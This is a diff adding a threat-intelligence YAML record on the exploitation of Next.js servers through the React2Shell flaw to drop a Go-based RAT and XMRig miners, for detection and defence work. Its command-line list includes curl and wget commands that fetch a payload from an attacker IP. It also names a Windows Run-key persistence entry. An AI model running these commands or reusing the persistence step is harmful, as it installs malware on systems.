@@ -1,0 +1,52 @@
+description: Opportunistic attackers exploited CVE 2025-55812 (React2Shell) to gain
+  remote command execution on exposed Next.js servers, deploying a Go-based RAT followed
+  by cryptominers like XMrig.
+attribution: Likely North Korean affiliated actors
+malware_families:
+- Go-based RAT
+- XMRig
+TTPs:
+  processes:
+  - Next.js server
+  - vim
+  - curl
+  - wget
+  - x
+  - nodejs
+  commandline:
+  - /home/wasiluser/dashboard/x
+  - /home/wasiluser/.cache/.sys/
+  - curl -L http://146.70.192.180/x -o /home/wasiluser/dashboard/x
+  - wget -O /home/wasiluser/dashboard/x http://146.70.192.180/x
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Lite360
+  image_load:
+  - kugou.dll
+  network_connections:
+  - Next.js server->146.70.192.180:80
+  - x->146.70.192.180:80
+  file_activity:
+  - /home/wasiluser/dashboard/x
+  - /home/wasiluser/.cache/.sys/
+  - C:\\ProgramData\\Technology360NB\\DataTechnology.exe
+  - C:\\ProgramData\\Technology360NB\\kugou.dll
+  persistence:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Lite360
+  process_relations: []
+CVEs:
+- CVE-2025-55812
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 146.70.192.180
+  domains: []
+  urls:
+  - http://146.70.192.180/x
+  - nodejs.org
+authors:
+- Nathaniel Jones
+reference: https://www.darktrace.com/blog/react2shell-reflections-cloud-insights-finance-sector-impacts-and-how-threat-actors-moved-so-quickly
+date_of_publication: January 14, 2026
+file_creation_date: January 19, 2026
